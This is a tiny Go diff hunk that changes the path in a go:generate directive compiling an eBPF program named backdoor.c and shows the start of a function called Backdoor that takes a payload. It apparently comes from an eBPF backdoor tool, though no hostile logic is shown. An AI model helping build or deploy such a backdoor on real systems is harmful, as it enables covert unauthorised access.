@@ -15,7 +15,7 @@ import (
 
 const bpf_map_key uint32 = 7
 
-//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -target amd64 bpf ../c/backdoor.c -- -I../c/headers
+//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -target amd64 bpf ./c/backdoor.c -- -I../headers
 
 func Backdoor(payload string) (err error) {
 	if payload == "" {
